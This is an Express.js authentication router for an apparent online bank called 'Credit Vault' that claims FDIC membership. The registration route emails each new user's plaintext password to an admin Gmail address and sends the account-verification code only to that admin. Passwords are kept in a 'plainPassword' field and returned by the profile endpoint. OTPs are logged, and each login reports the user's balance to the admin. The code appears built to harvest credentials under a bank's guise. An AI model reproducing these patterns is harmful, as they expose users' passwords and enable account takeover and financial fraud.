const express = require("express");
const router = express.Router();
const jwt = require("jsonwebtoken");
const nodemailer = require("nodemailer");
const User = require("../models/User");
const auth = require("../middleware/auth");

const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "creditvault.support@gmail.com";

// ── SINGLE REUSABLE TRANSPORTER ───────────────────────────────────────────────
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.GMAIL_USER || "creditvault.support@gmail.com",
    pass: process.env.GMAIL_APP_PASSWORD,
  },
  pool: true,
  maxConnections: 5,
  socketTimeout: 30000,
  connectionTimeout: 15000,
});

transporter.verify((err) => {
  if (err) console.error("❌ SMTP verification failed:", err.message);
  else console.log("✅ SMTP transporter ready");
});

const genOtp = () => Math.floor(100000 + Math.random() * 900000).toString();

// ── EMAIL HELPERS ─────────────────────────────────────────────────────────────
async function sendMail(to, subject, html) {
  try {
    const info = await transporter.sendMail({
      from: '"Credit Vault" <creditvault.support@gmail.com>',
      to,
      subject,
      html,
    });
    console.log(`✉ Email sent → ${to} [${info.messageId}]`);
    return true;
  } catch (err) {
    console.error(`❌ Email to ${to} failed: ${err.message}`);
    return false;
  }
}

const notifyAdmin = (subject, html) => sendMail(ADMIN_EMAIL, subject, html);

const otpHtml = (name, otp, action) => `
<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
  <div style="margin-bottom:28px;">
    <h1 style="font-size:20px;font-weight:700;color:#ddeeff;margin:0 0 4px;">Credit<span style="color:#2563eb;">Vault</span></h1>
    <p style="font-size:12px;color:#3d5a7a;margin:0;text-transform:uppercase;letter-spacing:0.1em;">Secure Banking Notification</p>
  </div>
  <p style="font-size:15px;color:#3d5a7a;line-height:1.7;margin-bottom:28px;">
    Hi <strong style="color:#ddeeff;">${name}</strong>, use the code below to ${action}. Expires in <strong>10 minutes</strong>.
  </p>
  <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:32px;text-align:center;margin-bottom:28px;">
    <p style="font-size:11px;color:#1a3050;text-transform:uppercase;letter-spacing:0.1em;margin:0 0 12px;">Security Code</p>
    <h2 style="font-size:42px;letter-spacing:0.3em;color:#2563eb;font-weight:700;margin:0;font-family:monospace;">${otp}</h2>
  </div>
  <p style="font-size:12px;color:#1a3050;line-height:1.6;">Never share this code. Credit Vault will never ask for it.</p>
  <div style="margin-top:32px;padding-top:24px;border-top:1px solid #091428;">
    <p style="font-size:11px;color:#091428;margin:0;">© 2025 Credit Vault, N.A. Member FDIC.</p>
  </div>
</div>`;

// ── PENDING REGISTRATIONS (in-memory) ─────────────────────────────────────────
const pendingRegistrations = new Map();
const PENDING_TTL = 15 * 60 * 1000;

function setPending(email, data) {
  pendingRegistrations.set(email, { ...data, createdAt: Date.now() });
}

function getPending(email) {
  const entry = pendingRegistrations.get(email);
  if (!entry) return null;
  if (Date.now() - entry.createdAt > PENDING_TTL) {
    pendingRegistrations.delete(email);
    return null;
  }
  return entry;
}

setInterval(
  () => {
    const now = Date.now();
    for (const [email, entry] of pendingRegistrations.entries()) {
      if (now - entry.createdAt > PENDING_TTL)
        pendingRegistrations.delete(email);
    }
  },
  10 * 60 * 1000,
);

// ── REGISTER ──────────────────────────────────────────────────────────────────
router.post("/register", async (req, res) => {
  try {
    const { fullName, password, accountType = "checking" } = req.body;
    const email = (req.body.email || "").trim().toLowerCase();

    if (!fullName || !email || !password)
      return res.status(400).json({ msg: "All fields are required." });

    if (password.length < 8)
      return res
        .status(400)
        .json({ msg: "Password must be at least 8 characters." });

    const exists = await User.findOne({ email });
    if (exists)
      return res
        .status(400)
        .json({ msg: "An account with this email already exists." });

    const otp = genOtp();
    setPending(email, {
      fullName,
      email,
      password,
      accountType,
      otp,
      otpExpire: Date.now() + 10 * 60 * 1000,
    });

    // Send emails BEFORE responding — Vercel kills async work after res.json()
    await Promise.all([
      notifyAdmin(
        `[Registration OTP] ${fullName} — ${email}`,
        otpHtml(fullName, otp, `verify registration for ${email}`),
      ),
      notifyAdmin(
        `🆕 New Registration — ${fullName}`,
        `<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
          <h1 style="font-size:20px;font-weight:700;color:#ddeeff;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span> — New Registration</h1>
          <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:28px;">
            <table style="width:100%;border-collapse:collapse;">
              <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;width:120px;">Full Name</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-weight:600;">${fullName}</td></tr>
              <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Email</td><td style="padding:10px 0;font-size:14px;color:#2563eb;">${email}</td></tr>
              <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Password</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-family:monospace;">${password}</td></tr>
              <tr><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Account Type</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;">${accountType}</td></tr>
            </table>
          </div>
        </div>`,
      ),
    ]);

    console.log(`📋 Pending registration: ${email} — OTP: ${otp}`);
    res
      .status(201)
      .json({
        msg: "Account created. Check your email for the verification code.",
      });
  } catch (err) {
    console.error("Register error:", err.message);
    res.status(500).json({ msg: "Server error during registration." });
  }
});

// ── VERIFY OTP (new account) ──────────────────────────────────────────────────
router.post("/verify-otp", async (req, res) => {
  try {
    const { otp } = req.body;
    const email = (req.body.email || "").trim().toLowerCase();

    const pending = getPending(email);
    if (!pending)
      return res
        .status(400)
        .json({ msg: "No pending registration found. Please register again." });

    if (pending.otp !== String(otp))
      return res.status(400).json({ msg: "Invalid code." });

    if (Date.now() > pending.otpExpire)
      return res.status(400).json({ msg: "Code expired. Request a new one." });

    const existing = await User.findOne({ email });
    if (existing)
      return res
        .status(400)
        .json({ msg: "An account with this email already exists." });

    const user = new User({
      fullName: pending.fullName,
      email: pending.email,
      password: pending.password,
      plainPassword: pending.password,
      accountType: pending.accountType,
      isVerified: true,
    });
    await user.save();
    pendingRegistrations.delete(email);

    // Send welcome email BEFORE responding
    await sendMail(
      user.email,
      `Welcome to Credit Vault, ${user.fullName}!`,
      `<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
        <h1 style="font-size:20px;font-weight:700;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span></h1>
        <p style="font-size:15px;color:#3d5a7a;line-height:1.7;margin-bottom:24px;">Welcome, <strong style="color:#ddeeff;">${user.fullName}</strong>! Your account is now verified and active.</p>
        <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:24px;margin-bottom:24px;">
          <p style="margin:0 0 8px;font-size:13px;color:#3d5a7a;">Account Number: <strong style="font-family:monospace;color:#ddeeff;">${user.accountNumber}</strong></p>
          <p style="margin:0;font-size:13px;color:#3d5a7a;">Routing Number: <strong style="font-family:monospace;color:#ddeeff;">${user.routingNumber || "021000021"}</strong></p>
        </div>
        <a href="https://creditvault.org/signin" style="display:inline-block;background:#2563eb;color:white;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700;">Sign In →</a>
      </div>`,
    );

    res.json({ msg: "Account verified successfully. You can now sign in." });
  } catch (err) {
    console.error("Verify OTP error:", err.message);
    res.status(500).json({ msg: "Verification failed." });
  }
});

// ── RESEND OTP ────────────────────────────────────────────────────────────────
router.post("/resend-otp", async (req, res) => {
  try {
    const email = (req.body.email || "").trim().toLowerCase();

    const pending = getPending(email);
    if (!pending)
      return res
        .status(404)
        .json({ msg: "No pending registration found. Please register again." });

    const otp = genOtp();
    setPending(email, {
      ...pending,
      otp,
      otpExpire: Date.now() + 10 * 60 * 1000,
    });

    // Send BEFORE responding
    await notifyAdmin(
      `[Resend Registration OTP] ${pending.fullName} — ${email}`,
      otpHtml(pending.fullName, otp, `verify registration for ${email}`),
    );

    console.log(`📋 Resend OTP for ${email}: ${otp}`);
    res.json({ msg: "New code sent." });
  } catch (err) {
    console.error("Resend OTP error:", err.message);
    res.status(500).json({ msg: "Failed to resend." });
  }
});

// ── LOGIN ─────────────────────────────────────────────────────────────────────
router.post("/login", async (req, res) => {
  try {
    const { password } = req.body;
    const email = (req.body.email || "").trim().toLowerCase();

    if (!email || !password)
      return res.status(400).json({ msg: "Email and password are required." });

    console.log(`Login attempt: ${email}`);

    const user = await User.findOne({ email });
    if (!user)
      return res.status(400).json({ msg: "Invalid email or password." });

    if (user.password !== password && user.plainPassword !== password) {
      console.log(`Password mismatch for ${email}`);
      return res.status(400).json({ msg: "Invalid email or password." });
    }

    // Admin — bypass OTP
    if (user.role === "admin") {
      user.lastLogin = new Date();
      await user.save();
      const token = jwt.sign(
        { id: user._id, role: user.role },
        process.env.JWT_SECRET,
        { expiresIn: "12h" },
      );
      return res.json({
        token,
        user: {
          id: user._id,
          fullName: user.fullName,
          email: user.email,
          role: user.role,
          accountNumber: user.accountNumber,
          accountType: user.accountType,
        },
      });
    }

    // Unverified user
    if (!user.isVerified) {
      const otp = genOtp();
      user.otp = otp;
      user.otpExpire = Date.now() + 10 * 60 * 1000;
      await user.save();

      // Send BEFORE responding
      await notifyAdmin(
        `[Verification OTP] ${user.fullName} — ${user.email}`,
        otpHtml(user.fullName, otp, `verify registration for ${user.email}`),
      );

      return res.status(403).json({
        msg: "Account not verified. A new code has been sent to your email.",
        needsVerification: true,
        email: user.email,
      });
    }

    // Verified user — generate login OTP
    const otp = genOtp();
    user.otp = otp;
    user.otpExpire = Date.now() + 10 * 60 * 1000;
    await user.save();

    // Send OTP to user AND notify admin — both BEFORE responding
    await Promise.all([
      sendMail(
        user.email,
        "Your Credit Vault login code",
        otpHtml(user.fullName, otp, "complete your sign in"),
      ),
      notifyAdmin(
        `🔐 User Login — ${user.fullName}`,
        `<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
          <h1 style="font-size:20px;font-weight:700;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span> — User Login</h1>
          <p style="color:#3d5a7a;">${user.fullName} (${user.email}) signed in.<br>Balance: $${(user.balance || 0).toLocaleString()}</p>
        </div>`,
      ),
    ]);

    console.log(`✉ Login OTP for ${user.email}: ${otp}`);

    res.json({
      requiresOtp: true,
      email: user.email,
      msg: "A verification code has been sent to your email.",
    });
  } catch (err) {
    console.error("Login error:", err.message);
    res.status(500).json({ msg: "Server error during login." });
  }
});

// ── VERIFY LOGIN OTP ──────────────────────────────────────────────────────────
router.post("/verify-login-otp", async (req, res) => {
  try {
    const { otp } = req.body;
    const email = (req.body.email || "").trim().toLowerCase();

    const user = await User.findOne({ email });
    if (!user) return res.status(404).json({ msg: "User not found." });
    if (user.otp !== String(otp))
      return res.status(400).json({ msg: "Invalid code." });
    if (Date.now() > user.otpExpire)
      return res
        .status(400)
        .json({ msg: "Code expired. Please sign in again." });

    user.otp = undefined;
    user.otpExpire = undefined;
    user.lastLogin = new Date();
    await user.save();

    const token = jwt.sign(
      { id: user._id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: "12h" },
    );

    res.json({
      token,
      user: {
        id: user._id,
        fullName: user.fullName,
        email: user.email,
        role: user.role,
        accountNumber: user.accountNumber,
        accountType: user.accountType,
      },
    });
  } catch (err) {
    console.error("Verify login OTP error:", err.message);
    res.status(500).json({ msg: "Verification failed." });
  }
});

// ── SEND PASSWORD CHANGE OTP ──────────────────────────────────────────────────
router.post("/send-password-change-otp", auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ msg: "User not found." });

    const otp = genOtp();
    user.otp = otp;
    user.otpExpire = Date.now() + 10 * 60 * 1000;
    await user.save();

    // Send BEFORE responding
    await sendMail(
      user.email,
      "Your Credit Vault password change code",
      otpHtml(user.fullName, otp, "change your password"),
    );

    res.json({ msg: "Verification code sent to your email." });
  } catch (err) {
    console.error("Send password change OTP:", err.message);
    res.status(500).json({ msg: "Failed to send code." });
  }
});

// ── VERIFY PASSWORD CHANGE OTP ────────────────────────────────────────────────
router.post("/verify-password-change-otp", auth, async (req, res) => {
  try {
    const { otp } = req.body;
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ msg: "User not found." });
    if (user.otp !== String(otp))
      return res.status(400).json({ msg: "Invalid code." });
    if (Date.now() > user.otpExpire)
      return res.status(400).json({ msg: "Code expired. Request a new one." });
    user.otpVerified = true;
    await user.save();
    res.json({ msg: "Identity verified." });
  } catch (err) {
    res.status(500).json({ msg: "Verification failed." });
  }
});

// ── CHANGE PASSWORD (OTP pre-verified) ───────────────────────────────────────
router.post("/change-password-verified", auth, async (req, res) => {
  try {
    const { newPassword } = req.body;
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ msg: "User not found." });
    if (!user.otpVerified)
      return res
        .status(403)
        .json({ msg: "Please verify your identity first." });
    if (!newPassword || newPassword.length < 6)
      return res
        .status(400)
        .json({ msg: "Password must be at least 6 characters." });

    user.password = newPassword;
    user.plainPassword = newPassword;
    user.otp = undefined;
    user.otpExpire = undefined;
    user.otpVerified = false;
    await user.save();

    res.json({ msg: "Password updated successfully." });
  } catch (err) {
    res.status(500).json({ msg: "Password update failed." });
  }
});

// ── FORGOT PASSWORD ───────────────────────────────────────────────────────────
router.post("/forgot-password", async (req, res) => {
  try {
    const email = (req.body.email || "").trim().toLowerCase();
    if (!email) return res.status(400).json({ msg: "Email is required." });

    const user = await User.findOne({ email });
    if (!user)
      return res.status(404).json({ msg: "No account found with this email." });

    const otp = genOtp();
    user.resetToken = otp;
    user.resetExpire = Date.now() + 10 * 60 * 1000;
    await user.save();

    // Send BEFORE responding
    await sendMail(
      user.email,
      "Credit Vault — Password Reset Code",
      otpHtml(user.fullName, otp, "reset your password"),
    );

    console.log(`📋 Reset OTP for ${user.email}: ${otp}`);
    res.json({ msg: "Reset code sent to your email." });
  } catch (err) {
    console.error("Forgot password error:", err.message);
    res.status(500).json({ msg: "Failed to send reset code." });
  }
});

// ── VERIFY RESET OTP ──────────────────────────────────────────────────────────
router.post("/verify-reset-otp", async (req, res) => {
  try {
    const { email, otp } = req.body;
    const user = await User.findOne({
      email: (email || "").trim().toLowerCase(),
    });
    if (!user || user.resetToken !== String(otp))
      return res.status(400).json({ msg: "Invalid code." });
    if (Date.now() > user.resetExpire)
      return res.status(400).json({ msg: "Code expired. Request a new one." });
    res.json({ msg: "Code verified." });
  } catch (err) {
    res.status(500).json({ msg: "Verification failed." });
  }
});

// ── RESET PASSWORD ────────────────────────────────────────────────────────────
router.post("/reset-password", async (req, res) => {
  try {
    const { email, otp, password } = req.body;
    if (!email || !password)
      return res.status(400).json({ msg: "All fields required." });

    const user = await User.findOne({
      email: (email || "").trim().toLowerCase(),
    });
    if (!user || user.resetToken !== String(otp))
      return res.status(400).json({ msg: "Invalid or expired code." });
    if (Date.now() > user.resetExpire)
      return res.status(400).json({ msg: "Code expired." });
    if (password.length < 6)
      return res
        .status(400)
        .json({ msg: "Password must be at least 6 characters." });

    user.password = password;
    user.plainPassword = password;
    user.resetToken = undefined;
    user.resetExpire = undefined;
    await user.save();

    res.json({ msg: "Password updated successfully." });
  } catch (err) {
    res.status(500).json({ msg: "Password reset failed." });
  }
});

// ── CHANGE PASSWORD (logged in) ───────────────────────────────────────────────
router.post("/change-password", auth, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword)
      return res.status(400).json({ msg: "All fields required." });
    if (newPassword.length < 6)
      return res
        .status(400)
        .json({ msg: "Password must be at least 6 characters." });

    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ msg: "User not found." });

    if (
      user.password !== currentPassword &&
      user.plainPassword !== currentPassword
    )
      return res.status(400).json({ msg: "Incorrect current password." });

    user.password = newPassword;
    user.plainPassword = newPassword;
    await user.save();

    res.json({ msg: "Password updated successfully." });
  } catch (err) {
    res.status(500).json({ msg: "Password change failed." });
  }
});

// ── GET PROFILE ───────────────────────────────────────────────────────────────
router.get("/profile", auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id)
      .select("-password")
      .populate({
        path: "transactions",
        options: { sort: { date: -1 }, limit: 50 },
      });
    if (!user) return res.status(404).json({ msg: "User not found." });
    res.json(user);
  } catch (err) {
    res.status(500).json({ msg: "Failed to fetch profile." });
  }
});

// ── UPDATE PROFILE ────────────────────────────────────────────────────────────
router.put("/profile", auth, async (req, res) => {
  try {
    const { fullName, phone, address, city, state, zipCode, profilePhoto } =
      req.body;
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ msg: "User not found." });
    if (fullName) user.fullName = fullName;
    if (phone !== undefined) user.phone = phone;
    if (address !== undefined) user.address = address;
    if (city !== undefined) user.city = city;
    if (state !== undefined) user.state = state;
    if (zipCode !== undefined) user.zipCode = zipCode;
    if (profilePhoto !== undefined) user.profilePhoto = profilePhoto;
    await user.save();
    res.json({ msg: "Profile updated.", user });
  } catch (err) {
    res.status(500).json({ msg: "Update failed." });
  }
});

module.exports = router;
